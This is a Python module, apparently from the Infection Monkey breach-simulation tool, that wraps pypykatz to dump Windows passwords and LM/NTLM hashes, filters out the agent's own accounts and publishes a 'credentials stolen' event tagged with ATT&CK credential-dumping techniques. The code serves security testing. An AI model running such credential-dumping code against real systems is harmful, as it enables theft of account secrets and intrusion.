import logging
from typing import Sequence

from common.agent_events import CredentialsStolenEvent
from common.credentials import Credentials, LMHash, NTHash, Password, Username
from common.event_queue import IAgentEventQueue
from common.tags import T1003_ATTACK_TECHNIQUE_TAG, T1005_ATTACK_TECHNIQUE_TAG
from common.types import AgentID
from infection_monkey.i_puppet import ICredentialCollector
from infection_monkey.model import USERNAME_PREFIX

from . import pypykatz_handler
from .windows_credentials import WindowsCredentials

logger = logging.getLogger(__name__)


MIMIKATZ_CREDENTIAL_COLLECTOR_TAG = "mimikatz-credentials-collector"

MIMIKATZ_EVENT_TAGS = frozenset(
    (
        MIMIKATZ_CREDENTIAL_COLLECTOR_TAG,
        T1003_ATTACK_TECHNIQUE_TAG,
        T1005_ATTACK_TECHNIQUE_TAG,
    )
)


class MimikatzCredentialCollector(ICredentialCollector):
    def __init__(self, agent_event_queue: IAgentEventQueue, agent_id: AgentID):
        self._agent_event_queue = agent_event_queue
        self._agent_id = agent_id

    def collect_credentials(self, options=None) -> Sequence[Credentials]:
        logger.info("Attempting to collect windows credentials with pypykatz.")
        windows_credentials = pypykatz_handler.get_windows_creds()

        logger.info(f"Pypykatz gathered {len(windows_credentials)} credentials.")

        collected_credentials = MimikatzCredentialCollector._to_credentials(windows_credentials)

        self._publish_credentials_stolen_event(collected_credentials)

        return collected_credentials

    @staticmethod
    def _to_credentials(windows_credentials: Sequence[WindowsCredentials]) -> Sequence[Credentials]:
        credentials = []
        for wc in windows_credentials:
            # Mimikatz picks up users created by the Monkey even if they're successfully deleted
            # since it picks up creds from the registry. The newly created users are not removed
            # from the registry until a reboot of the system, hence this check.
            if wc.username and wc.username.startswith(USERNAME_PREFIX):
                continue

            identity = None

            if wc.username:
                identity = Username(username=wc.username)

            if wc.password:
                password = Password(password=wc.password)
                credentials.append(Credentials(identity=identity, secret=password))

            if wc.lm_hash:
                lm_hash = LMHash(lm_hash=wc.lm_hash)
                credentials.append(Credentials(identity=identity, secret=lm_hash))

            if wc.ntlm_hash:
                ntlm_hash = NTHash(nt_hash=wc.ntlm_hash)
                credentials.append(Credentials(identity=identity, secret=ntlm_hash))

            if len(credentials) == 0 and identity is not None:
                credentials.append(Credentials(identity=identity, secret=None))

        return credentials

    def _publish_credentials_stolen_event(self, collected_credentials: Sequence[Credentials]):
        credentials_stolen_event = CredentialsStolenEvent(
            source=self._agent_id,
            tags=MIMIKATZ_EVENT_TAGS,
            stolen_credentials=collected_credentials,
        )

        self._agent_event_queue.publish(credentials_stolen_event)
